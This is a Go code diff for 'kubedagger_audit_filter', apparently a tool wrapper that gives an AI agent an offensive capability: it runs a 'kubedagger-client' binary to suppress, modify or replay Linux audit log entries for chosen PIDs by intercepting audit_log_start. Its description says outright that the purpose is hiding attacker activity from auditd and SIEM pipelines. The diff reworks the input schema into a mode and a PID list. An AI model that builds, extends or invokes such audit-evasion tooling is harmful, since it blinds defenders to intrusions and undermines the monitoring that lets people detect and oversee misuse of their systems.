@@ -11,11 +11,8 @@ import (
 )
 
 type AuditFilterInput struct {
-	Action    string `json:"action"`
-	Syscall   string `json:"syscall,omitempty"`
-	PID       int    `json:"pid,omitempty"`
-	User      string `json:"user,omitempty"`
-	Namespace string `json:"namespace,omitempty"`
+	Mode string `json:"mode,omitempty"`
+	Pids string `json:"pids,omitempty"`
 }
 
 type AuditFilterTool struct {
@@ -29,36 +26,23 @@ func NewAuditFilter(exec executor.Executor) *AuditFilterTool {
 func (t *AuditFilterTool) Name() string { return "kubedagger_audit_filter" }
 
 func (t *AuditFilterTool) Description() string {
-	return "Suppress Linux audit and Kubernetes audit log entries by intercepting audit_log_start and kube-apiserver audit webhook calls. Filters events matching specified criteria before they reach the audit backend."
+	return "Suppress, modify, or replay Linux audit log entries by intercepting audit_log_start. Filters events from specified processes before they reach the audit backend, hiding attacker activity from auditd and SIEM pipelines."
 }
 
 func (t *AuditFilterTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"mode": {
 				"type": "string",
-				"enum": ["suppress", "modify", "redirect", "status"],
-				"description": "Filter action"
+				"enum": ["suppress", "modify", "replay"],
+				"description": "Audit filter mode (default: suppress)"
 			},
-			"syscall": {
+			"pids": {
 				"type": "string",
-				"description": "Syscall name to suppress from audit (e.g., 'execve', 'connect')"
-			},
-			"pid": {
-				"type": "integer",
-				"description": "Suppress all audit events from this PID"
-			},
-			"user": {
-				"type": "string",
-				"description": "Suppress events from this user/service account"
-			},
-			"namespace": {
-				"type": "string",
-				"description": "Suppress Kubernetes audit events from this namespace"
+				"description": "Comma-separated list of PIDs whose audit events are filtered (e.g. '1234,5678')"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -68,28 +52,16 @@ func (t *AuditFilterTool) Execute(ctx context.Context, params json.RawMessage) (
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Syscall, "syscall"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.User, "user"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateNamespace(input.Namespace); err != nil {
+	if err := validatePIDList(input.Pids); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"audit-filter", "--action", input.Action}
-	if input.Syscall != "" {
-		args = append(args, "--syscall", input.Syscall)
+	args := []string{"audit-filter"}
+	if input.Mode != "" {
+		args = append(args, "--mode", input.Mode)
 	}
-	if input.PID > 0 {
-		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
-	}
-	if input.User != "" {
-		args = append(args, "--user", input.User)
-	}
-	if input.Namespace != "" {
-		args = append(args, "--namespace", input.Namespace)
+	if input.Pids != "" {
+		args = append(args, "--pids", input.Pids)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -103,7 +75,7 @@ func (t *AuditFilterTool) Execute(ctx context.Context, params json.RawMessage) (
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Audit Filter: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Audit Filter\n\n")
 	if output == "" {
 		sb.WriteString("Filter active.\n")
 	} else {
